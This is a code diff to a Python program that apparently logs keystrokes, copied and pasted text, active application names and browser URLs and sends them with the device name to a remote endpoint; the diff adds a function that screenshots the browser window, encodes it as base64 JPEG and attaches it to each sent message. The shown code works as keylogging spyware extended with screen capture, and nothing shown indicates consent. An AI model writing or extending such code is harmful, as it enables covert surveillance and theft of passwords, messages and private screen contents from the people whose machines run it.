@@ -13,12 +13,14 @@ import sys
 import ctypes
 import tempfile
 import uuid
+from io import BytesIO
 from urllib.parse import urlparse
 from ctypes import wintypes
 from queue import Queue
 from threading import Lock, Thread, Timer
 from urllib.error import URLError, HTTPError
 from urllib.request import Request, urlopen
+from PIL import ImageGrab
 
 from pynput.keyboard import Key, KeyCode, Listener
 try:
@@ -151,6 +153,22 @@ def get_browser_url(app_name):
     except Exception:
         return ""
     return ""
+
+
+def capture_browser_screenshot(app_name):
+    browser_names = ("chrome.exe", "msedge.exe", "firefox.exe", "brave.exe", "opera.exe")
+    executable = app_name.split(" - ", 1)[0].strip().lower()
+    if executable not in browser_names:
+        return ""
+
+    try:
+        image = ImageGrab.grab(all_screens=False)
+        image.thumbnail((1600, 1000))
+        output = BytesIO()
+        image.convert("RGB").save(output, format="JPEG", quality=60, optimize=True)
+        return base64.b64encode(output.getvalue()).decode("ascii")
+    except Exception:
+        return ""
 
 
 def get_clipboard_text():
@@ -373,7 +391,7 @@ def post_message(payload, quiet=False):
         return False
 
 
-def send_message(text, app_name, source_url="", raw_text=None, is_pasted=False, is_copied=False):
+def send_message(text, app_name, source_url="", raw_text=None, is_pasted=False, is_copied=False, screenshot_base64=""):
     global last_message_id
     last_message_id = max(last_message_id + 1, int(time.time() * 1000))
     payload = {
@@ -384,6 +402,7 @@ def send_message(text, app_name, source_url="", raw_text=None, is_pasted=False, 
         "device_name": device_name,
         "app_name": app_name,
         "source_url": source_url,
+        "screenshot_base64": screenshot_base64,
         "is_pasted": is_pasted,
         "is_copied": is_copied,
     }
@@ -491,8 +510,8 @@ def message_sender():
     last_retry_at = 0
     while True:
         try:
-            text, app_name, source_url, raw_text, is_pasted, is_copied = message_queue.get(timeout=5)
-            send_message(text, app_name, source_url, raw_text, is_pasted, is_copied)
+            text, app_name, source_url, raw_text, is_pasted, is_copied, screenshot_base64 = message_queue.get(timeout=5)
+            send_message(text, app_name, source_url, raw_text, is_pasted, is_copied, screenshot_base64)
             message_queue.task_done()
         except Exception:
             pass
@@ -529,7 +548,9 @@ def queue_copied_clipboard(target):
     time.sleep(0.1)
     copied_text = get_clipboard_text().strip()
     if copied_text:
-        message_queue.put((copied_text, target, get_browser_url(target), copied_text, False, True))
+        source_url = get_browser_url(target)
+        message_queue.put((copied_text, target, source_url, copied_text, False, True,
+                   capture_browser_screenshot(target) if not source_url else ""))
 
 
 def flush_message_buffer():
@@ -543,7 +564,9 @@ def flush_message_buffer():
     message_started_ms = None
     if text:
         target = active_target or get_active_app()
-        message_queue.put((text, target, get_browser_url(target), raw_text, False, False))
+        source_url = get_browser_url(target)
+        message_queue.put((text, target, source_url, raw_text, False, False,
+                   capture_browser_screenshot(target) if not source_url else ""))
     active_target = None
     active_target_key = None
 
@@ -580,7 +603,9 @@ def on_press(key):
             if pasted_text:
                 flush_message_buffer()
                 target, target_key = get_active_target()
-                message_queue.put((pasted_text, target, get_browser_url(target), pasted_text, True, False))
+                source_url = get_browser_url(target)
+                message_queue.put((pasted_text, target, source_url, pasted_text, True, False,
+                                   capture_browser_screenshot(target) if not source_url else ""))
             return
 
         symbol = normalize_key(key)
